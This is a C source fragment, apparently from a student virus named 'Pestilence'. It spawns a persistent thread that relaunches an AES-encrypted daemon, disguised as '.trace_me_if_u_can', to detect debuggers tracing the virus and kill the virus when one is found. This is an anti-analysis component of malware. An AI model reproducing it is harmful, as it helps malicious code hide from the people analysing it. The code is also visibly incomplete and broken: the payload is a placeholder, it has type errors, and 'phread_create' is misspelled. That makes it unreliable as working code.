
/*
** this files contains the tracer checker in a kind of 
** advanced thread process (ATP). That method is usually used
** to take data in the backgroond but it can be used for ofuscation
**
** Durring Pestilence execution, a pthread with a persistent tracer checker
** will be launched. This phread will execute each n time a function/program (to see)
** persistence_tracer.c this function or program will check if theres a 
** not allowed tracer tracing the pid of Pestilance and will kill Pestilance process
** if its happends. When Pestilance execution is end, the thread ends.
*/

typedef struct  s_atp
{
    char        **env;
    char        pestilence;
}               t_atp;

#define PERSISTENT_TRACER_CHECKER "to write here encrypted hexdump code"
#define PTC_NAME                    "tmp/trace_me_if_u_can" // path

char                run_atp(t_atp *atp)
{
    t_aes           *aes;
    const char      hexdump[] = PERSISTENT_TRACER_CHECKER;
    const char      name = PTC_NAME;

    if ((aes = init_aes()))
    {
        aes->error = 0;
        execute_daemon(aes, name, (char *)hexdump, atp->env);
        return (SUCCESS);
    }
    return (FAILURE);
}

#define PROCESS_ATP     {".trace_me_if_u_can", NULL} // process: persistent process name

/* have to secutize more this fcts */
void                *__atp__(void *ptr)
{
    t_atp           *atp;
    size_t          time;
    const size_t    time_to_wait = 3000000;
    char            waiting;
    const char      process[] = PROCESS_ATP;

    atp = (t_atp *)ptr;
    time = 0;
    waiting = 0;
    while (atp->pestilence)
    {
        if (waiting == 1 && (!time || time > time_to_wait))
        {
            time = 0;
            waiting = 0;
        }
        else
            time += 1000;
        if (!waiting && !check_process(process))
        {
            run_atp(atp);
            waiting = 1;
            time = 1;
        }
        usleep(1000);
    }
    return (NULL);
}

char                build_atp(t_atp *atp)
{
    pthread_t       thread;

    run_atp(atp);
    if (phread_create(&thread, NULL, __atp__, (void *)atp))
        return (FAILURE);
    return (SUCCESS);
}